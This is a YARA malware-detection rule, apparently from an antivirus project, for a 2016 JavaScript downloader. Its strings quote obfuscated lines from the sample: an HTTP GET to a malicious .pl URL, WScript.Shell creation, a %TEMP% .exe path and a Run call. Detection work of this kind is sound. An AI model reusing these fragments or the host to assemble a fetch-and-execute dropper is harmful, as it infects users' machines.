rule sig_20160401_d9c334336dab99eed9d6730a40083a86 {
  meta:
    description = "datamaliciousorder - file 20160401_d9c334336dab99eed9d6730a40083a86.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d50246f5973e868868f91e878c8285cf528fade43846d6124b17dfe2f86a62dd"

  strings:
    $s1  = "LxYj[OveBl](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "var VmpLnb = function EblYe() {return WScript[CtFy](\"WScript\"+\".Shell\");}(), OaOie = 11;" fullword ascii
    $s3  = "function CjNm(TnvKe, SqIv){IjLh = IjLh * 1; return TnvKe - SqIv;};" fullword ascii
    $s4  = "if (LxYj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NdcQre() {return VmpLnb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5Y5RI3Rvav.ex\" + \"e\";};" fullword ascii
    $s6  = "function AyYq(){return ErnCt + \"\";};" fullword ascii
    $s7  = "function MtlKkv() {return ((LbqAh == true) && (LbqAh == DgeOd)) ? 1 : IjLh;};" fullword ascii
    $s8  = "var BqPjf = false;" fullword ascii
    $s9  = "function TvUck(){return CtFy;};" fullword ascii
    $s10 = "}while (DcCg);" fullword ascii
    $s11 = "var LbqAh = false;" fullword ascii
    $s12 = "var DgeOd = false;" fullword ascii
    $s13 = "function QdGu()" fullword ascii
    $s14 = "DgeOd = true; " fullword ascii
    $s15 = "function BuxFt(MbBm){VmpLnb[\"R\"+\"un\"](MbBm, IjLh, IjLh);};" fullword ascii
    $s16 = "function GgtGb(JgmJu) {var MdqCo = (1, 2, 3, 4, 5, JgmJu); return MdqCo;};" fullword ascii
    $s17 = "return CjNm(ZuhSgr, IplBbg);" fullword ascii
    $s18 = "LbqAh = true; " fullword ascii
    $s19 = "var QmcEt = new this[\"Date\"]();" fullword ascii
    $s20 = "function KwrFom(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}